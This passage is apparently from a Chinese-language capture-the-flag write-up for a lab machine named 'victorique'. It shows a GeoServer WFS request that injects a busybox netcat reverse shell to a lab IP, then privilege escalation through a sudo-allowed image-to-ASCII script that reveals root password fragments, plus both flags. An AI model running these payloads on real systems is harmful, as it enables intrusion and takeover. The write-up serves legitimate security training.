p://www.opengis.net/fes/2.0'\u003c/span\u003e\n xmlns:wfs=\u003cspan class=\"hljs-string\"\u003e'http://www.opengis.net/wfs/2.0'\u003c/span\u003e\u003e\n  \u0026#x3C;wfs:Query typeNames=\u003cspan class=\"hljs-string\"\u003e'sf:archsites'\u003c/span\u003e/\u003e\n  \u0026#x3C;wfs:valueReference\u003e\u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e(java.lang.Runtime.getRuntime(),\u003cspan class=\"hljs-string\"\u003e'busybox nc 192.168.56.102 1234 -e /bin/bash'\u003c/span\u003e)\u0026#x3C;/wfs:valueReference\u003e\n\u0026#x3C;/wfs:GetPropertyValue\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功反弹\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Machinevictorique/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003evictorique@Victorique:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \nflag{user-Gosick-Cordelia Gallo}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003cp\u003e在家目录能找到 \u003ccode\u003ehint\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003evictorique@Victorique:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e hint.txt \nFound some useful fragments. Converted them into a visual representation.\n\n                                                         --Cordelia Gallo\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e找到了一些有用的片段，并将它们转换成了可视化的形式。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e并且家目录下有一个 \u003cstrong\u003e\u003ccode\u003epng\u003c/code\u003e\u003c/strong\u003e 文件，仅允许 root 查看\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003evictorique@Victorique:~$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 140\ndrwxr-xr-x  4 victorique victorique   4096 Dec 12 21:35 .\ndrwxr-xr-x  3 root       root         4096 Dec 12 04:55 ..\nlrwxrwxrwx  1 root       root            9 Dec 12 02:36 .bash_history -\u003e /dev/null\n-rw-r--r--  1 victorique victorique    220 Apr 18  2019 .bash_logout\n-rw-r--r--  1 victorique victorique   3526 Apr 18  2019 .bashrc\ndrwxr-xr-x 12 victorique victorique   4096 Dec 12 00:21 Geo\n-rw-r--r--  1 root       root          149 Dec 12 21:35 hint.txt\n***-rwx------  1 root       root       105918 Dec 12 04:08 .kagura.png***\ndrwxr-xr-x  2 victorique victorique   4096 Dec 12 21:36 .oracle_jre_usage\n-rw-r--r--  1 victorique victorique    807 Apr 18  2019 .profile\n-rw-r--r--  1 root       root           33 Dec 12 02:40 user.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看 sudo 权限，需要密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003evictorique@Victorique:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\n[\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e victorique: \n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e: a password is required\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e枚举后，在 \u003ccode\u003e/var/www/html/login.php\u003c/code\u003e 中能找到用户 \u003ccode\u003evictorique\u003c/code\u003e 的密码 \u003ccode\u003eshinigami_qujo\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003evictorique@Victorique:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /var/www/html/login.php | grep Password\n    // 用户 victorique 的密码,User victorique\u003cspan class=\"hljs-string\"\u003e's Password: shinigami_qujo\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再次查看 sudo 权限\u003c/p\u003e\n\u003cp\u003e可以以 root 权限运行 \u003ccode\u003e/usr/bin/python3 /opt/img2txt.py *\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003evictorique@Victorique:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\n[\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e victorique: \nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e victorique on Victorique:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser victorique may run the following commands on Victorique:\n    (ALL) /usr/bin/python3 /opt/img2txt.py *\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看文件内容，可以知道该文件来自于项目：\u003ca href=\"https://github.com/vietnh1009/ASCII-generator\"\u003ehttps://github.com/vietnh1009/ASCII-generator\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eimg2txt\u003c/code\u003e 是将图片格式文件转换城ASCII艺术的工具，并且家目录刚好有没有权限查看的图片\u003c/p\u003e\n\u003cp\u003e将其进行转换\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003evictorique@Victorique:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/python3 /opt/img2txt.py --input .kagura.png --output 1.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将图片转换为了 ASCII 艺术\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Machinevictorique/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e寻找其他图片，总共三个图片后缀找到了图片\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003evictorique@Victorique:~$ find / -name \u003cspan class=\"hljs-string\"\u003e\"*.png\"\u003c/span\u003e ! -readable 2\u003e/dev/null\n/home/victorique/.kagura.png\n/opt/.kujo.png\n/etc/ssh/.shinigami.png\n/var/www/html/.victorique.png\n\nvictorique@Victorique:~$ find / -name \u003cspan class=\"hljs-string\"\u003e\"*.webp\"\u003c/span\u003e ! -readable 2\u003e/dev/null\n/gallo.webp\n/var/www/html/IoIooIIOIOio/sunset.webp\n\nvictorique@Victorique:~$ find / -name \u003cspan class=\"hljs-string\"\u003e\"*.ppm\"\u003c/span\u003e ! -readable 2\u003e/dev/null\n/usr/games/.haru.ppm\n/var/mail/.ciallo.ppm\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e全部尝试之后，其中 \u003ccode\u003e/etc/ssh/.shinigami.png\u003c/code\u003e 和 \u003ccode\u003e/var/www/html/IoIooIIOIOio/sunset.webp\u003c/code\u003e 以及 \u003ccode\u003e/usr/games/.haru.ppm\u003c/code\u003e 都是能转译成文字的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/python3 /opt/img2txt.py --input /etc/ssh/.shinigami.png --output 1.txt --mode simple\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/python3 /opt/img2txt.py --input /var/www/html/IoIooIIOIOio/sunset.webp --output 2.txt --mode simple\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/python3 /opt/img2txt.py --input /usr/games/.haru.ppm --output 3.txt --mode simple\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e分别是 \u003ccode\u003ech4mp\u003c/code\u003e，\u003ccode\u003eC11pp3r5\u003c/code\u003e，\u003ccode\u003e10n5h1p\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Machinevictorique/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e能组合成如下字符串：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ech4mpC11pp3r510n5h1p\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ech4mp10n5h1pC11pp3r5\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eC11pp3r5ch4mp10n5h1p\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eC11pp3r510n5h1pch4mp\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e10n5h1pch4mpC11pp3r5\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e10n5h1pC11pp3r5ch4mp\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e进行密码碰撞，\u003ccode\u003eC11pp3r5ch4mp10n5h1p\u003c/code\u003e 为 \u003ccode\u003eroot\u003c/code\u003e 用户密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003evictorique@Victorique:~$ su root\nPassword:  \u003cspan class=\"hljs-comment\"\u003e# C11pp3r5ch4mp10n5h1p\u003c/span\u003e\nroot@Victorique:/home/victorique# \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eroot.png\u003c/code\u003e 也是要通过 \u003ccode\u003eimg2txt.py\u003c/code\u003e 进行转换，并且需要指定大小参数，否则显示太模糊\u003c/p\u003e\n\u003cp\u003e或者你可以将文件传输到攻击机然后打开\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@Victorique:~# python3 /opt/img2txt.py --input root.png --output root.txt --num_cols 1000\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Machinevictorique/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e全部是：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eflag{root-Gosick-Victorique De Blois}\n\u003c/code\u003e\u003c/pre\u003e","title":"Machine - victorique","date":"2025-12-13","updated":"2025-12-13","tags":["Linux","FUZZ","ASCII"],"categories":"靶机","comments":true,"description":"靶机 victorique 渗透测试 writeup，涵盖 Fuzzing 技术、ASCII 编码漏洞利用与权限提升全过程。"}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"Machinevictorique"},"buildId":"vclGxen3fZVR4YumfIyhL","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
